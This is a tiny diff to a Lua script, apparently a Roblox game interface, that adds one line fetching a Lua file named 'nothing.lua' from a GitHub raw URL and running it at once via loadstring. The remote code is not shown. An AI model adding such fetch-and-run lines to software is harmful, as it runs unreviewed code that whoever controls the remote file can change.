@@ -10,4 +10,4 @@ local slots = Background.Slots.ScrollingFrame
 local slot = slots.Slot1
 local rarities = Background.Rarities.ScrollingFrame
 
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yNyvek13/a/refs/heads/main/nothing.lua"))()
